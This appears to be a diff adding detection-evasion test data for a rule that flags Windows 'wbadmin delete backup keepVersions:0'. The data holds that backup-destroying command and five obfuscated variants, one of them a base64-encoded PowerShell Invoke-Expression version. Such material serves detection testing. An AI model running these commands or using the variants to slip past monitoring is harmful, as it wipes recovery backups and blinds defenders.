@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_wbadmin_delete_backups_0",
+  "original_command": "\\wbadmin.exe WBADMIN.EXE delete backup keepVersions:0",
+  "evasions": {
+    "insertion": "\\wbadmin.exe WBADMIN.EXE delete bac\"kup\" keepVersions:0",
+    "substitution": "\\wbadmin.exe WBADMIN.EXE delete backup keepVersions:0 #substitution",
+    "omission": "\\wbadmin WBADMIN delete backup keepVersions:0",
+    "reordering": "\\wbadmin.exe delete keepVersions:0 WBADMIN.EXE backup",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XHdiYWRtaW4uZXhlIFdCQURNSU4uRVhFIGRlbGV0ZSBiYWNrdXAga2VlcFZlcnNpb25zOjA=')) | Invoke-Expression\" "
+  }
+}
